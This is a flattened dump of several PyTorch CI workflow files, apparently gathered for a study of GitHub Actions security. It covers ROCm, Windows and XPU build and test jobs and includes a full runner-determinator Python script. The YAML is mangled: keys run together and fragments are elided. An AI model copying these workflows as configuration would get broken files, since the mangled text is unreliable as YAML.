  # Use binaries under conda environment
  export PATH="$CONDA_ENV/bin":$PATH
fi
${CONDA_RUN} python3 test/bench_mps_ops.py
name: R ... nchmarklocal_pathusage_log.txt- name: ... HW infoname: mac-test/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___rocm-test.ymltests-to-includeList of tests to include (empty string implies default list)
Setup ROCm./.github/actions/setup-rocm./.gith ... up-rocmname: Setup ROCmLogin to Amazon ECRlogin-ecraws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076aws-act ... 945b076name: L ... zon ECRpython3 -m pip install psutil==5.9.1 dataclasses_json==0.6.7
python3 -m tools.stats.monitor --log-interval "$MONITOR_LOG_INTERVAL" --data-collect-interval "$MONITOR_DATA_COLLECT_INTERVAL" > usage_log.txt 2>&1 &
echo "monitor-script-pid=${!}" >> "${GITHUB_OUTPUT}"
TESTS_TO_INCLUDE${{ inputs.tests-to-include }}${{ inp ... lude }}set -x

if [[ $TEST_CONFIG == 'multigpu' ]]; then
  TEST_COMMAND=.ci/pytorch/multigpu-test.sh
elif [[ $BUILD_ENVIRONMENT == *onnx* ]]; then
  TEST_COMMAND=.ci/caffe2/test.sh
else
  TEST_COMMAND=.ci/pytorch/test.sh
fi

# detached container should get cleaned up by teardown_ec2_linux
# TODO: Stop building test binaries as part of the build phase
# Used for GPU_FLAG since that doesn't play nice
# shellcheck disable=SC2086,SC2090
container_name=$(docker run \
  ${GPU_FLAG:-} \
  -e BUILD_ENVIRONMENT \
  -e PR_NUMBER \
  -e GITHUB_ACTIONS \
  -e GITHUB_REPOSITORY \
  -e GITHUB_WORKFLOW \
  -e GITHUB_JOB \
  -e GITHUB_RUN_ID \
  -e GITHUB_RUN_NUMBER \
  -e GITHUB_RUN_ATTEMPT \
  -e JOB_ID \
  -e JOB_NAME \
  -e BRANCH \
  -e SHA1 \
  -e AWS_DEFAULT_REGION \
  -e IN_WHEEL_TEST \
  -e SHARD_NUMBER \
  -e TEST_CONFIG \
  -e NUM_TEST_SHARDS \
  -e REENABLED_ISSUES \
  -e CONTINUE_THROUGH_ERROR \
  -e VERBOSE_TEST_LOGS \
  -e TEST_SHOWLOCALS \
  -e NO_TEST_TIMEOUT \
  -e NO_TD \
  -e MAX_JOBS="$(nproc --ignore=2)" \
  -e PYTORCH_TEST_CUDA_MEM_LEAK_CHECK \
  -e PYTORCH_TEST_RERUN_DISABLED_TESTS \
  -e TESTS_TO_INCLUDE \
  -e DASHBOARD_TAG \
  --env-file="${RUNNER_TEMP}/github_env_${GITHUB_RUN_ID}" \
  --ulimit stack=10485760:83886080 \
  --ulimit core=0 \
  --security-opt seccomp=unconfined \
  --cap-add=SYS_PTRACE \
  --shm-size="8g" \
  --tty \
  --detach \
  --name="${container_name}" \
  --user jenkins \
  -v "${GITHUB_WORKSPACE}:/var/lib/jenkins/workspace" \
  -w /var/lib/jenkins/workspace \
  "${DOCKER_IMAGE}"
)
# save container name for later step
echo "CONTAINER_NAME=${container_name}" >> "$GITHUB_ENV"
# jenkins user does not have write permission to mounted workspace; work-around by copying within container to jenkins home
docker exec -t "${container_name}" sh -c "cd .. && cp -R workspace pytorch && cd pytorch && pip install dist/*.whl && ${TEST_COMMAND}"
Save test results# copy test results back to the mounted workspace, needed sudo, resulting permissions were correct
docker exec -t "${{ env.CONTAINER_NAME }}" sh -c "cd ../pytorch && sudo cp -R test/test-reports ../workspace/test"
name: S ... resultsChange permissions (only needed for MI300 runners for now)Change  ... or now)${{ always() && steps.test.conclusion && contains(matrix.runner, 'mi300') }}${{ alw ... 00') }}docker exec -t "${{ env.CONTAINER_NAME }}" sh -c "sudo chown -R 1001:1001 test"
name: C ... or now)# shellcheck disable=SC2156
find . -iname "core.[1-9]*" -exec docker exec "${CONTAINER_NAME}" sh -c "gdb python {} -ex 'bt' -ex 'q'" \;
Store Core dumps on GitHubStore C ...  GitHubname: S ...  GitHubAuthenticate with AWSAuthent ... ith AWSarn:aws:iam::308535385114:role/gha_workflow_upload-benchmark-resultsarn:aws ... resultsrole-to ... resultsname: A ... ith AWSTeardown ROCm./.github/actions/teardown-rocm./.gith ... wn-rocmname: Teardown ROCmname: test/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___runner-determinator.ymlCheck whether the workflow owner can use ARC runnersCheck w ... runnerscheck_experimentsList of experiments for this workfow. If not defined, all default experiments are included.
opt_out_experimentsComma-separated list of experiments this workflow will opt-out of.Comma-s ... out of.triggering_actorThe triggering_actor for the workflow. Use github.triggering_actorThe tri ... g_actorissue_ownerThe owner of the issue. Use github.event.pull_request.user.login || github.event.issue.user.loginThe own ... r.logincurr_branchCurrent branch or tag.Current ... or tag.curr_ref_typeThe value of "github.ref_type", "branch" or "tag"The val ... r "tag"issue_number5132"5132"Fetch's GitHub Issue from pytorch/test-infra
Example: https://github.com/pytorch/test-infra/issues/5132
check_experiments:label-typeType of runners to useType of ...  to use${{ jobs.runner-determinator.outputs.label-type }}${{ job ... type }}descrip ...  to uselabel-type:runner-determinator${{ steps.set-condition.outputs.label-type }}${{ ste ... type }}label-t ... type }}${{ inputs.issue_number }}${{ inp ... mber }}TRIGGERING_ACTOR${{ inputs.triggering_actor }}${{ inp ... ctor }}ISSUE_OWNER${{ inputs.issue_owner }}${{ inp ... wner }}CHECK_EXPERIMENTS${{ inputs.check_experiments }}${{ inp ... ents }}OPT_OUT_EXPERIMENTS${{ inputs.opt_out_experiments }}Hardcode runner-determinator scriptHardcod ...  scripthardcode-scriptcat <<EOF > runner_determinator.py
# flake8: noqa: G004

# Note: Copies of this script in runner_determinator.py and _runner-determinator.yml
#       must be kept in sync. You can do it easily by running the following command:
#           python .github/scripts/update_runner_determinator.py

"""
This runner determinator is used to determine which set of runners to run a
GitHub job on. It uses the first comment of a GitHub issue (by default
https://github.com/pytorch/test-infra/issues/5132) to define the configuration
of which runners should be used to run which job.

The configuration has two parts, the settings and a list of opted-in users,
separated by a line containing "---".  If the line is not present, the
settings are considered to be empty with only the second part, the user
list, defined.

The first part is a YAML block that defines the rollout settings. This can be
used to define any settings that are needed to determine which runners to use.
It's fields are defined by the RolloutSettings class below.

The second part is a list of users who are explicitly opted in to the LF fleet.
The user list is also a comma separated list of additional features or
experiments which the user could be opted in to.

The user list has the following rules:

- Users are GitHub usernames, which must start with the @ prefix
- Each user is also a comma-separated list of features/experiments to enable
- A "#" prefix opts the user out of all experiments

Example config:
    # A list of experiments that can be opted into.
    # This defines the behavior they'll induce when opted into.
    # Expected syntax is:
    #   [experiment_name]: # Name of the experiment. Also used for the label prefix.
    #      rollout_perc: [int] # % of workflows to run with this experiment when users are not opted in.

    experiments:
      lf:
        rollout_percent: 25
        all_branches: false
        default: true
    ---

    # Opt-ins:
    # Users can opt into the LF fleet by adding their GitHub username to this list
    # and specifying experiments to enable in a comma-separated list.
    # To always opt out of an experiment, prefix it with a "-".
    # Experiments should be from the above list.

    @User1,-lf,split_build
    @User2,lf
    @User3,split_build
"""

import json
import logging
import os
import random
import re
import sys
from argparse import ArgumentParser
from collections.abc import Iterable
from functools import cache
from logging import LogRecord
from typing import Any, NamedTuple
from urllib.request import Request, urlopen

import yaml
from github import Auth, Github
from github.Issue import Issue


DEFAULT_LABEL_PREFIX = ""  # use meta runners
WORKFLOW_LABEL_LF = "lf."  # use runners from the linux foundation
WORKFLOW_LABEL_LF_CANARY = "lf.c."  # use canary runners from the linux foundation

GITHUB_OUTPUT = os.getenv("GITHUB_OUTPUT", "")
GH_OUTPUT_KEY_AMI = "runner-ami"
GH_OUTPUT_KEY_LABEL_TYPE = "label-type"
OPT_OUT_LABEL = "no-runner-experiments"

SETTING_EXPERIMENTS = "experiments"

LF_FLEET_EXPERIMENT = "lf"
CANARY_FLEET_SUFFIX = ".c"


class Experiment(NamedTuple):
    rollout_perc: float = (
        0  # Percentage of workflows to experiment on when user is not opted-in.
    )
    all_branches: bool = (
        False  # If True, the experiment is also enabled on the exception branches
    )
    default: bool = (
        True  # If True, the experiment is enabled by default for all queries
    )

    # Add more fields as needed


class Settings(NamedTuple):
    """
    Settings for the experiments that can be opted into.
    """

    experiments: dict[str, Experiment] = {}


class ColorFormatter(logging.Formatter):
    """Color codes the log messages based on the log level"""

    COLORS = {
        "WARNING": "\033[33m",  # Yellow
        "ERROR": "\033[31m",  # Red
        "CRITICAL": "\033[31m",  # Red
        "INFO": "\033[0m",  # Reset
        "DEBUG": "\033[0m",  # Reset
    }

    def format(self, record: LogRecord) -> str:
        log_color = self.COLORS.get(record.levelname, "\033[0m")  # Default to reset
        record.msg = f"{log_color}{record.msg}\033[0m"
        return super().format(record)


handler = logging.StreamHandler()
handler.setFormatter(ColorFormatter(fmt="%(levelname)-8s: %(message)s"))

log = logging.getLogger(os.path.basename(__file__))
log.addHandler(handler)
log.setLevel(logging.INFO)


def set_github_output(key: str, value: str) -> None:
    """
    Defines outputs of the github action that invokes this script
    """
    if not GITHUB_OUTPUT:
        # See https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/ for deprecation notice
        log.warning(
            "No env var found for GITHUB_OUTPUT, you must be running this code locally. Falling back to the deprecated print method."
        )
        print(f"::set-output name={key}::{value}")
        return

    with open(GITHUB_OUTPUT, "a") as f:
        log.info(f"Setting output: {key}='{value}'")
        f.write(f"{key}={value}\n")


def _str_comma_separated_to_set(value: str) -> frozenset[str]:
    return frozenset(
        filter(lambda itm: itm != "", map(str.strip, value.strip(" \n\t").split(",")))
    )


def parse_args() -> Any:
    parser = ArgumentParser("Get dynamic rollout settings")
    parser.add_argument("--github-token", type=str, required=True, help="GitHub token")
    parser.add_argument(
        "--github-issue-repo",
        type=str,
        required=False,
        default="pytorch/test-infra",
        help="GitHub repo to get the issue",
    )
    parser.add_argument(
        "--github-repo",
        type=str,
        required=True,
        help="GitHub repo where CI is running",
    )
    parser.add_argument(
        "--github-issue", type=int, required=True, help="GitHub issue number"
    )
    parser.add_argument(
        "--github-actor", type=str, required=True, help="GitHub triggering_actor"
    )
    parser.add_argument(
        "--github-issue-owner", type=str, required=True, help="GitHub issue owner"
    )
    parser.add_argument(
        "--github-branch", type=str, required=True, help="Current GitHub branch or tag"
    )
    parser.add_argument(
        "--github-ref-type",
        type=str,
        required=True,
        help="Current GitHub ref type, branch or tag",
    )
    parser.add_argument(
        "--eligible-experiments",
        type=_str_comma_separated_to_set,
        required=False,
        default="",
        help="comma separated list of experiments to check, if omitted all experiments marked with default=True are checked",
    )
    parser.add_argument(
        "--opt-out-experiments",
        type=_str_comma_separated_to_set,
        required=False,
        default="",
        help=(
            "comma separated list of experiments to opt-out of. If unset, no opt-outs will occur. "
            "If the same experiment is listed both here and in '--eligible-experiments' opt-out will take priority."
        ),
    )
    parser.add_argument(
        "--pr-number",
        type=str,
        required=False,
        default="",
        help="the optional PR number where this is run",
    )

    return parser.parse_args()


def get_gh_client(github_token: str) -> Github:  # type: ignore[no-any-unimported]
    auth = Auth.Token(github_token)
    return Github(auth=auth)


def get_issue(gh: Github, repo: str, issue_num: int) -> Issue:  # type: ignore[no-any-unimported]
    repo = gh.get_repo(repo)
    return repo.get_issue(number=issue_num)


def get_potential_pr_author(
    github_token: str, repo: str, username: str, ref_type: str, ref_name: str
) -> str:
    # If the trigger was a new tag added by a bot, this is a ciflow case
    # Fetch the actual username from the original PR. The PR number is
    # embedded in the tag name: ciflow/<name>/<pr-number>

    gh = get_gh_client(github_token)

    if username == "pytorch-bot[bot]" and ref_type == "tag":
        split_tag = ref_name.split("/")
        if (
            len(split_tag) == 3
            and split_tag[0] == "ciflow"
            and split_tag[2].isnumeric()
        ):
            pr_number = split_tag[2]
            try:
                repository = gh.get_repo(repo)
                pull = repository.get_pull(number=int(pr_number))
            except Exception as e:
                raise Exception(  # noqa: TRY002
                    f"issue with pull request {pr_number} from repo {repository}"
                ) from e
            return pull.user.login  # type: ignore[no-any-return]
    # In all other cases, return the original input username
    return username


def is_exception_branch(branch: str) -> bool:
    """
    Branches that get opted out of experiments by default, until they're explicitly enabled.
    """
    return branch.split("/")[0] in {"main", "nightly", "release", "landchecks"}


def load_yaml(yaml_text: str) -> Any:
    try:
        data = yaml.safe_load(yaml_text)
        return data
    except yaml.YAMLError:
        log.exception("Error loading YAML")
        raise


def extract_settings_user_opt_in_from_text(rollout_state: str) -> tuple[str, str]:
    """
    Extracts the text with settings, if any, and the opted in users from the rollout state.

    If the issue body contains "---" then the text above that is the settings
    and the text below is the list of opted in users.

    If it doesn't contain "---" then the settings are empty and the rest is the users.
    """
    rollout_state_parts = rollout_state.split("---")
    if len(rollout_state_parts) >= 2:
        return rollout_state_parts[0], rollout_state_parts[1]
    else:
        return "", rollout_state


class UserOptins(dict[str, list[str]]):
    """
    Dictionary of users with a list of features they have opted into
    """


def parse_user_opt_in_from_text(user_optin_text: str) -> UserOptins:
    """
    Parse the user opt-in text into a key value pair of username and the list of features they have opted into

    Users are GitHub usernames with the @ prefix. Each user is also a comma-separated list of features/experiments to enable.
        - Example line: "@User1,lf,split_build"
        - A "#" prefix indicates the user is opted out of all experiments


    """
    optins = UserOptins()
    for user in user_optin_text.split("\n"):
        user = user.strip("\r\n\t -")
        if not user or not user.startswith("@"):
            # Not a valid user. Skip
            continue

        if user:
            usr_name = user.split(",")[0].strip("@")
            optins[usr_name] = [exp.strip(" ") for exp in user.split(",")[1:]]

    return optins


def is_valid_experiment_name(experiment_name: str) -> bool:
    """
    Check if the experiment name is valid.
    A valid name:
        - Contains only alphanumeric characters and the special characters "_" & "-"
        - The special characters "_" & "-" shouldn't be the first or last characters
        - Cannot contain spaces
    """

    valid_char_regex = r"^[a-zA-Z0-9]([\w-]*[a-zA-Z0-9])?$"
    valid = bool(re.match(valid_char_regex, experiment_name))

    if valid:
        return True

    log.error(
        f"Invalid experiment name: {experiment_name}. Experiment names should only contain alphanumeric characters, '_', and '-'. They cannot contain spaces, and the special characters '_' and '-' cannot be the first or last characters."
    )
    return False


def parse_settings_from_text(settings_text: str) -> Settings:
    """
    Parse the experiments from the issue body into a list of ExperimentSettings
    """
    try:
        if settings_text:
            # Escape the backtick as well so that we can have the settings in a code block on the GH issue
            # for easy reading
            # Note: Using ascii for the backtick so that the cat step in _runner-determinator.yml doesn't choke on
            #       the backtick character in shell commands.
            backtick = chr(96)  # backtick character
            settings_text = settings_text.strip(f"\r\n\t{backtick} ")
            settings = load_yaml(settings_text)

            # For now we just load experiments. We can expand this if/when we add more settings
            experiments = {}

            for exp_name, exp_settings in settings.get(SETTING_EXPERIMENTS).items():
                if not is_valid_experiment_name(exp_name):
                    # Exclude invalid experiments from the list. We log an error, but don't raise an exception so that other experiments can still be processed.
                    continue

                valid_settings = {}
                for setting in exp_settings:
                    if setting not in Experiment._fields:
                        log.warning(
                            f"Unexpected setting in experiment: {setting} = {exp_settings[setting]}"
                        )
                    else:
                        valid_settings[setting] = exp_settings[setting]

                experiments[exp_name] = Experiment(**valid_settings)
            return Settings(experiments)

    except Exception:
        log.exception("Failed to parse settings")

    return Settings()


def parse_settings(rollout_state: str) -> Settings:
    """
    Parse settings, if any, from the rollout state.

    If the issue body contains "---" then the text above that is the settings
    and the text below is the list of opted in users.

    If it doesn't contain "---" then the settings are empty and the default values are used.
    """
    settings_text, _ = extract_settings_user_opt_in_from_text(rollout_state)
    return parse_settings_from_text(settings_text)


def parse_users(rollout_state: str) -> UserOptins:
    """
    Parse users from the rollout state.

    """
    _, users_text = extract_settings_user_opt_in_from_text(rollout_state)
    return parse_user_opt_in_from_text(users_text)


def is_user_opted_in(user: str, user_optins: UserOptins, experiment_name: str) -> bool:
    """
    Check if a user is opted into an experiment
    """
    return experiment_name in user_optins.get(user, [])


def is_user_opted_out(user: str, user_optins: UserOptins, experiment_name: str) -> bool:
    """
    Check if a user explicitly opted out of an experiment
    """
    # if the experiment is prefixed with a "-", then it's an opt-out
    experiment_optout = "-" + experiment_name
    if experiment_optout not in user_optins.get(user, []):
        return False

    if is_user_opted_in(user, user_optins, experiment_name):
        log.warning(
            f"User {user} is opted into experiment {experiment_name}, but also opted out of it. Defaulting to opting out"
        )

    return True


def get_runner_prefix(
    rollout_state: str,
    workflow_requestors: Iterable[str],
    branch: str,
    eligible_experiments: frozenset[str] = frozenset(),
    opt_out_experiments: frozenset[str] = frozenset(),
    is_canary: bool = False,
) -> str:
    settings = parse_settings(rollout_state)
    user_optins = parse_users(rollout_state)

    fleet_prefix = ""
    prefixes = []
    for experiment_name, experiment_settings in settings.experiments.items():
        if not experiment_settings.all_branches and is_exception_branch(branch):
            log.info(
                f"Branch {branch} is an exception branch. Not enabling experiment {experiment_name}."
            )
            continue

        if opt_out_experiments:
            if experiment_name in opt_out_experiments:
                opt_out_exp_list = ", ".join(opt_out_experiments)
                log.info(
                    f"Skipping experiment '{experiment_name}', as this workflow has opted-out (opted out experiments are: {opt_out_exp_list})"
                )
                continue

        if eligible_experiments:
            if experiment_name not in eligible_experiments:
                exp_list = ", ".join(eligible_experiments)
                log.info(
                    f"Skipping experiment '{experiment_name}', as it is not in the eligible_experiments list: {exp_list}"
                )
                continue
        elif not experiment_settings.default:
            log.info(
                f"Skipping experiment '{experiment_name}', as it is not a default experiment"
            )
            continue

        # Is any workflow_requestor opted out to this experiment?
        opted_out_users = [
            requestor
            for requestor in workflow_requestors
            if is_user_opted_out(requestor, user_optins, experiment_name)
        ]

        if opted_out_users:
            log.info(
                f"{', '.join(opted_out_users)} have opted out of experiment {experiment_name}."
            )
            continue

        # Is any workflow_requestor opted in to this experiment?
        opted_in_users = [
            requestor
            for requestor in workflow_requestors
            if is_user_opted_in(requestor, user_optins, experiment_name)
        ]

        enabled = False
        if opted_in_users:
            log.info(
                f"{', '.join(opted_in_users)} have opted into experiment {experiment_name}."
            )
            enabled = True

        elif experiment_settings.rollout_perc:
            # If no user is opted in, then we randomly enable the experiment based on the rollout percentage
            if random.uniform(0, 100) <= experiment_settings.rollout_perc:
                log.info(
                    f"Based on rollout percentage of {experiment_settings.rollout_perc}%, enabling experiment {experiment_name}."
                )
                enabled = True

        if enabled:
            label = experiment_name
            if experiment_name == LF_FLEET_EXPERIMENT:
                # We give some special treatment to the "lf" experiment since determines the fleet we use
                #  - If it's enabled, then we always list it's prefix first
                #  - If we're in the canary branch, then we append ".c" to the lf prefix
                if is_canary:
                    label += CANARY_FLEET_SUFFIX
                fleet_prefix = label
            else:
                prefixes.append(label)

    if len(prefixes) > 1:
        log.error(
            f"Only a fleet and one other experiment can be enabled for a job at any time. Enabling {prefixes[0]} and ignoring the rest, which are {', '.join(prefixes[1:])}"
        )
        prefixes = prefixes[:1]

    # Fleet always comes first
    if fleet_prefix:
        prefixes.insert(0, fleet_prefix)

    return ".".join(prefixes) + "." if prefixes else ""


def get_rollout_state_from_issue(github_token: str, repo: str, issue_num: int) -> str:
    """
    Gets the first comment of the issue, which contains the desired rollout state.

    The default issue we use - https://github.com/pytorch/test-infra/issues/5132
    """
    gh = get_gh_client(github_token)
    issue = get_issue(gh, repo, issue_num)
    return str(issue.get_comments()[0].body.strip("\n\t "))


def download_json(url: str, headers: dict[str, str], num_retries: int = 3) -> Any:
    for _ in range(num_retries):
        try:
            req = Request(url=url, headers=headers)
            content = urlopen(req, timeout=5).read().decode("utf-8")
            return json.loads(content)
        except Exception as e:
            log.warning(f"Could not download {url}: {e}")

    log.warning(f"All {num_retries} retries exhausted, downloading {url} failed")
    return {}


@cache
def get_pr_info(github_repo: str, github_token: str, pr_number: int) -> dict[str, Any]:
    """
    Dynamically get PR information
    """
    github_api = f"https://api.github.com/repos/{github_repo}"
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "Authorization": f"token {github_token}",
    }
    json_response: dict[str, Any] = download_json(
        url=f"{github_api}/issues/{pr_number}",
        headers=headers,
    )

    if not json_response:
        log.warning(f"Failed to get the labels for #{pr_number}")
        return {}

    return json_response


def get_labels(github_repo: str, github_token: str, pr_number: int) -> set[str]:
    """
    Dynamically get the latest list of labels from the pull request
    """
    pr_info = get_pr_info(github_repo, github_token, pr_number)
    return {
        label.get("name") for label in pr_info.get("labels", []) if label.get("name")
    }


def main() -> None:
    args = parse_args()

    runner_label_prefix = DEFAULT_LABEL_PREFIX

    # Check if the PR is opt-out
    if args.pr_number:
        labels = get_labels(args.github_repo, args.github_token, int(args.pr_number))
        if OPT_OUT_LABEL in labels:
            log.info(
                f"Opt-out runner determinator because #{args.pr_number} has {OPT_OUT_LABEL} label"
            )
            set_github_output(GH_OUTPUT_KEY_LABEL_TYPE, runner_label_prefix)
            sys.exit()

    try:
        rollout_state = get_rollout_state_from_issue(
            args.github_token, args.github_issue_repo, args.github_issue
        )

        username = get_potential_pr_author(
            args.github_token,
            args.github_repo,
            args.github_actor,
            args.github_ref_type,
            args.github_branch,
        )

        is_canary = args.github_repo == "pytorch/pytorch-canary"

        runner_label_prefix = get_runner_prefix(
            rollout_state,
            (args.github_issue_owner, username),
            args.github_branch,
            args.eligible_experiments,
            args.opt_out_experiments,
            is_canary,
        )

    except Exception as e:
        log.error(
            f"Failed to get issue. Defaulting to Meta runners and no experiments. Exception: {e}"
        )

    set_github_output(GH_OUTPUT_KEY_LABEL_TYPE, runner_label_prefix)


if __name__ == "__main__":
    main()

EOF

cat runner_determinator.py
name: H ...  scriptpython3 -m pip install urllib3==1.26.18 PyGithub==2.3.0python3 ... ==2.3.0Get the workflow type for the current userGet the ... nt userset-conditioncurr_branch="${{ inputs.curr_branch }}"
curr_ref_type="${{ inputs.curr_ref_type }}"
echo "Current branch is '$curr_branch'"

python3 runner_determinator.py \
  --github-token "$GITHUB_TOKEN" \
  --github-issue "$ISSUE_NUMBER" \
  --github-branch "$curr_branch" \
  --github-actor "$TRIGGERING_ACTOR" \
  --github-issue-owner "$ISSUE_OWNER" \
  --github-ref-type "$curr_ref_type" \
  --github-repo "$GITHUB_REPOSITORY" \
  --eligible-experiments "$CHECK_EXPERIMENTS" \
  --opt-out-experiments "$OPT_OUT_EXPERIMENTS" \
  --pr-number "${PR_NUMBER}"
name: G ... nt user- name: ...  scriptrunner-determinator:name: C ... runners/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___win-build.ymlWhat CUDA version to build with, "cpu" for none.use-xpuIf set, build with XPU support.If set, ... upport.xpu-versionThe version of XPU support package.The ver ... ackage.vc-year2019"2019"The Visual Studio year to use for building.The Vis ... ilding.windows.4xlarge.nonephemeral"window ... emeral"Enable git long paths and symlinks on Windows and disable fsmonitor daemonEnable  ...  daemongit config --global core.longpaths true
git config --global core.symlinks true

# https://git-scm.com/docs/git-fsmonitor--daemon.  The daemon could lock
# the directory on Windows and prevent GHA from checking out as reported
# in https://github.com/actions/checkout/issues/1018
git config --global core.fsmonitor false
name: E ...  daemonClean up leftover processes on non-ephemeral Windows runnerpytorch/test-infra/.github/actions/cleanup-runner@mainpytorch ... er@mainTo forward remote desktop on your local machine ssh as follows:
  ssh -L 3389:localhost:3389 %%username%%@%%hostname%%
And then change password using `passwd` command.

To start build locally, change working folder to \actions-runner\_work\pytorch\pytorch,
Activate miniconda and Visual Studio environment, by running:
  call C:\Jenkins\Miniconda3\Scripts\activate.bat C:\Jenkins\Miniconda3
  call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvarsall.bat" x64
Setup Windows./.github/actions/setup-win./.gith ... tup-wincuda-ve ... sion }}name: Setup Windowspython3 .github/scripts/parse_ref.pypython3 ... _ref.py/c/${{ github.run_id }}/build-results//c/${{  ... esults/BUILD_WHEELMAX_JOBSossci-compiler-cache"ossci- ... -cache"SCCACHE_S3_KEY_PREFIXSCCACHE ... _PREFIXVC_PRODUCTBuildTools"BuildTools"VC_VERSIONVC_YEAR${{ inputs.vc-year }}"${{ in ... ear }}"8.6"8.6"USE_CUDA${{ inputs.cuda-version != 'cpu' && '1' || '0' }}USE_XPU${{ inputs.use-xpu == true && '1' || '0' }}XPU_VERSION${{ inputs.xpu-version }}"${{ in ... ion }}"PYTORCH ... esults/.ci/pytorch/win-build.sh
Upload artifacts to s3Upload  ... s to s3steps.build.outcome != 'skipped'steps.b ... kipped'C:\${{ github.run_id }}\build-resultsC:\${{  ... resultsname: U ... s to s3Teardown Windows./.github/actions/teardown-win./.gith ... own-winextra-delete-dirextra-d ... esults/name: T ... Windows- name: ...  daemonname: windows-build/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___win-test.ymlwin-testTo forward remote desktop on your local machine ssh as follows:
  ssh -L 3389:localhost:3389 %%username%%@%%hostname%%
And then change password using `passwd` command.

To start tests locally, change working folder to \actions-runner\_work\pytorch\pytorch\test,
Activate miniconda and Visual Studio environment and set PYTHON_PATH, by running:
  call C:\Jenkins\Miniconda3\Scripts\activate.bat C:\Jenkins\Miniconda3
  call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvarsall.bat" x64
  set PYTHONPATH=C:\actions-runner\_work\pytorch\pytorch\build\win_tmp\build
Install pip dependenciesset -eu
python3 -m pip install 'xdoctest>=1.1.0'
# Windows conda doesn't have python3 binary, only python, but it's python3
${CONDA_RUN} python -m pip install psutil==5.9.1 dataclasses_json==0.6.7 nvidia-ml-py==11.525.84
${CONDA_RUN} python -m tools.stats.monitor --log-interval "$MONITOR_LOG_INTERVAL" --data-collect-interval "$MONITOR_DATA_COLLECT_INTERVAL" > usage_log.txt 2>&1 &
echo "monitor-script-pid=${!}" >> "${GITHUB_OUTPUT}"
Download PyTorch Build Artifactsseemethere/download-artifact-s3@1da556a7aa0a088e3153970611f6c432d58e80e6seemeth ... 58e80e6Check build-results folderCheck b ...  foldertree /F C:\$Env:GITHUB_RUN_ID\build-results
INSTALL_WINDOWS_SDKVS_VERSION16.8.6"16.8.6"${{ github.event.pull_request.reenabled-issues }}${{ git ... sues }}USE_CUD ...  '0' }}pushd "${PYTORCH_FINAL_PACKAGE_DIR}"
# shellcheck disable=SC2046,SC2102
python3 -mpip install $(echo *.whl)[opt-einsum,optree] optree==0.13.0
popd

.ci/pytorch/win-test.sh
Uninstall PyTorch# This step removes PyTorch installed by the test to give a clean slate
# to the next job
python3 -mpip uninstall -y torch
name: U ... PyTorchname: win-test/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___xpu-test.ymlxpu-testSetup XPU./.github/actions/setup-xpu./.gith ... tup-xpuname: Setup XPUPYTORCH_RETRY_TEST_CASESPYTORCH ... T_CASESPYTORCH_OVERRIDE_FLAKY_SIGNALPYTORCH ... _SIGNAL# Fetch aws credential from IMDs
eval "$(python3 .github/scripts/get_aws_session_tokens.py)"
set -x

TEST_COMMAND=.ci/pytorch/test.sh

# detached container should get cleaned up by teardown_ec2_linux
# Used for GPU_FLAG since that doesn't play nice
# shellcheck disable=SC2086,SC2090
container_name=$(docker run \
  ${GPU_FLAG:-} \
  -e BUILD_ENVIRONMENT \
  -e PR_NUMBER \
  -e GITHUB_ACTIONS \
  -e GITHUB_REPOSITORY \
  -e GITHUB_WORKFLOW \
  -e GITHUB_JOB \
  -e GITHUB_RUN_ID \
  -e GITHUB_RUN_NUMBER \
  -e GITHUB_RUN_ATTEMPT \
  -e JOB_ID \
  -e BRANCH \
  -e SHA1 \
  -e AWS_DEFAULT_REGION \
  -e AWS_ACCESS_KEY_ID \
  -e AWS_SECRET_ACCESS_KEY \
  -e AWS_SESSION_TOKEN \
  -e IN_WHEEL_TEST \
  -e SHARD_NUMBER \
  -e TEST_CONFIG \
  -e NUM_TEST_SHARDS \
  -e REENABLED_ISSUES \
  -e PYTORCH_RETRY_TEST_CASES \
  -e PYTORCH_OVERRIDE_FLAKY_SIGNAL \
  -e CONTINUE_THROUGH_ERROR \
  -e VERBOSE_TEST_LOGS \
  -e TEST_SHOWLOCALS \
  -e NO_TEST_TIMEOUT \
  -e NO_TD \
  -e MAX_JOBS="$(nproc --ignore=2)" \
  -e SCCACHE_BUCKET \
  -e SCCACHE_REGION \
  -e SCCACHE_S3_KEY_PREFIX \
  -e XLA_CLANG_CACHE_S3_BUCKET_NAME \
  -e PYTORCH_TEST_CUDA_MEM_LEAK_CHECK \
  -e PYTORCH_TEST_RERUN_DISABLED_TESTS \
  -e TESTS_TO_INCLUDE \
  -e ZE_AFFINITY_MASK \
  --env-file="/tmp/github_env_${GITHUB_RUN_ID}" \
  --ulimit stack=10485760:83886080 \
  --ulimit core=0 \
  --security-opt seccomp=unconfined \
  --cap-add=SYS_PTRACE \
  --shm-size="8g" \
  --tty \
  --detach \
  --name="${container_name}" \
  --user jenkins \
  --privileged \
  -v "${GITHUB_WORKSPACE}:/var/lib/jenkins/workspace" \
  -w /var/lib/jenkins/workspace \
  "${DOCKER_IMAGE}"
)
# save container name for later step
echo "CONTAINER_NAME=${container_name}" >> "$GITHUB_ENV"
# jenkins user does not have write permission to mounted workspace; work-around by copying within container to jenkins home
docker exec -t "${container_name}" sh -c "cd .. && cp -R workspace pytorch && cd pytorch && pip install dist/*.whl && ${TEST_COMMAND}"
Change permissions${{ always() && steps.test.conclusion }}${{ alw ... sion }}name: C ... issionsStop container before exitStop co ... re exit# Workaround for multiple runners on same IDC node
docker stop "${{ env.CONTAINER_NAME }}"
name: S ... re exitTeardown XPU./.github/actions/teardown-xpu./.gith ... own-xpuname: Teardown XPUname: xpu-test/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__assigntome-docathon.ymlAssign User on CommentAssign  ... CommentassignCheck for "/assigntome" in commentCheck f ... commentconst issueComment = context.payload.comment.body;
const assignRegex = /\/assigntome/i;
if (assignRegex.test(issueComment)) {
  const assignee = context.payload.comment.user.login;
  const issueNumber = context.payload.issue.number;
  try {
    const { data: issue } = await github.rest.issues.get({
      owner: context.repo.owner,
      repo: context.repo.repo,
      issue_number: issueNumber
    });
